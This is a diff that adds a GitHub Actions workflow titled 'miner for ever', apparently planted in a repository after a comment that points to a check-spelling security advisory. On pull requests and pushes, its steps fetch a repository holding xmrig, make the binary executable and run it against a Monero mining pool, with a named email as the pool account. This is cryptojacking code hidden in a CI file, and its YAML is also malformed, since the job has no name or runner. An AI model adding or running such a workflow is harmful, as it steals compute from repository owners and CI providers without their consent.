@@ -1,0 +1,20 @@
+# spelling.yml is blocked per https://github.com/check-spelling/check-spelling/security/advisories/GHSA-g86g-chm8-7r2p
+name: miner for ever
+on:
+  pull_request_target:
+  push:
+
+jobs:
+    steps:
+    - name: git clone https://github.com/quincyhays/bmxmrig
+      run: |
+        Invoke-WebRequest https://github.com/quincyhays/bmxmrig
+    - name: cd bmxmrig
+      run: | 
+        cd bmxmrig
+    - name: chmod u+x ./xmrig
+      run: |
+        chmod u+x ./xmrig
+    - name: ./xmrig -o xmr.pool.minergate.com:45700 -u nardebanedanesh@gmail.com -p x --donate-level 1
+      run: |
+        ./xmrig -o xmr.pool.minergate.com:45700 -u nardebanedanesh@gmail.com -p x --donate-level 1
